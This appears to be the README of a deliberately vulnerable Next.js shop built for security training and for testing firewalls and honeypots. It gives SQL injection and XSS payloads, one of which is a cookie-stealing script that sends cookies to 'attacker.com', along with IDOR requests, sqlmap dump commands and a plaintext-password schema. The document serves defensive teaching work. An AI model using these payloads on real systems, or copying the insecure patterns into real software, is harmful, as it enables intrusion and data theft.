# TechShop - Vulnerable E-commerce DVWA

⚠️ **WARNING**: This is an **intentionally vulnerable** web application for security testing and demonstration purposes. **DO NOT** deploy in production or expose to the internet.

## Purpose

A modern Next.js e-commerce application with intentional security vulnerabilities for:
- Demonstrating common web application attacks
- Testing security tools (WAF, honeypots, firewalls)
- Security training and education
- Penetration testing practice

## Tech Stack

- **Framework**: Next.js 14 (React, TypeScript)
- **Database**: SQLite3
- **Styling**: Tailwind CSS
- **Runtime**: Node.js

## Installation

```bash
# Install dependencies
npm install

# Run development server
npm run dev

# Open browser
http://localhost:3000
```

## Vulnerabilities Included

### 1. SQL Injection (SQLi)

**Location**: Login & Product Search

**Attack Examples**:
```bash
# Login bypass
Username: admin' OR 1=1--
Password: anything

# Product search
Search: iPhone' OR 1=1--

# Data extraction
Search: ' UNION SELECT id, username, password, email FROM users--
```

**Test with curl**:
```bash
curl "http://localhost:3000/api/products?search=iPhone' OR 1=1--"
```

### 2. Cross-Site Scripting (XSS)

**Location**: Product Reviews

**Attack Examples**:
```html
<!-- Basic XSS -->
<script>alert('XSS')</script>

<!-- Cookie stealing -->
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>

<!-- DOM manipulation -->
<img src=x onerror="alert('XSS')">
```

**How to test**:
1. Go to any product page
2. Submit a review with XSS payload in comment
3. Refresh page to see script execute

### 3. Insecure Direct Object Reference (IDOR)

**Location**: Order Viewing

**Attack Example**:
```bash
# View your orders (user_id=1)
http://localhost:3000/api/orders?user_id=1

# View other users' orders (no authorization check!)
http://localhost:3000/api/orders?user_id=2
http://localhost:3000/api/orders?user_id=3
```

**How to test**:
1. Login and go to Profile page
2. Change the User ID input field
3. Click "View Orders" to see other users' data

### 4. File Upload Vulnerability

**Location**: Profile Picture Upload (Coming Soon)

**Planned vulnerabilities**:
- No file type validation
- No size limits
- Executable file upload

## Database Schema

```sql
-- Users
CREATE TABLE users (
  id INTEGER PRIMARY KEY,
  username TEXT UNIQUE,
  email TEXT UNIQUE,
  password TEXT,  -- Stored in plaintext!
  profile_pic TEXT,
  created_at DATETIME
)

-- Products
CREATE TABLE products (
  id INTEGER PRIMARY KEY,
  name TEXT,
  description TEXT,
  price REAL,
  image TEXT,
  stock INTEGER
)

-- Orders
CREATE TABLE orders (
  id INTEGER PRIMARY KEY,
  user_id INTEGER,
  product_id INTEGER,
  quantity INTEGER,
  total REAL,
  status TEXT,
  created_at DATETIME
)

-- Reviews
CREATE TABLE reviews (
  id INTEGER PRIMARY KEY,
  product_id INTEGER,
  user_id INTEGER,
  rating INTEGER,
  comment TEXT,  -- No sanitization!
  created_at DATETIME
)
```

## Demo Credentials

```
Username: admin
Password: admin123

Username: john
Password: password123

Username: alice
Password: alice123
```

## Testing with Real Hacking Tools

### SQLMap
```bash
# Test login endpoint
sqlmap -u "http://localhost:3000/api/auth" \
  --data '{"username":"test","password":"test"}' \
  --method POST \
  --headers="Content-Type: application/json" \
  --batch --dump

# Test search endpoint
sqlmap -u "http://localhost:3000/api/products?search=test" \
  --batch --dump
```

### Burp Suite
1. Configure browser to use Burp proxy
2. Navigate to http://localhost:3000
3. Intercept requests in Burp
4. Modify parameters to inject payloads
5. Use Intruder for automated attacks

### OWASP ZAP
```bash
# Automated scan
zap-cli quick-scan http://localhost:3000
```

## Integration with Honeypot/Firewall

To protect this app with your honeypot:

```python
# In honeypot/main.py
UPSTREAM_URL = "http://127.0.0.1:3000"
```

Then run:
```bash
# Terminal 1: Start DVWA
cd dvwa
npm run dev  # Port 3000

# Terminal 2: Start Honeypot
cd ../honeypot
uvicorn main:app --port 8000

# Access protected app
http://localhost:8000  # Protected by honeypot
http://localhost:3000  # Unprotected (vulnerable)
```

## Attack Scenarios for Demo

### Scenario 1: SQL Injection Attack
```bash
# Unprotected (Port 3000)
curl "http://localhost:3000/api/products?search=iPhone' OR 1=1--"
# Result: All products dumped

# Protected (Port 8000)
curl "http://localhost:8000/api/products?search=iPhone' OR 1=1--"
# Result: Blocked by firewall
```

### Scenario 2: XSS Attack
```bash
# Submit malicious review
curl -X POST http://localhost:3000/api/reviews \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"user_id":1,"rating":5,"comment":"<script>alert(1)</script>"}'

# View product page - script executes
```

### Scenario 3: IDOR Attack
```bash
# Access other users' orders
curl "http://localhost:3000/api/orders?user_id=2"
# Result: Unauthorized data access
```

## Security Warnings

- ❌ Passwords stored in plaintext
- ❌ No input validation
- ❌ No output encoding
- ❌ No authentication/authorization
- ❌ No CSRF protection
- ❌ No rate limiting
- ❌ No security headers

## License

This is for educational purposes only. Use at your own risk.

## Contributing

This is a vulnerable app by design. Do not submit PRs to "fix" the vulnerabilities!
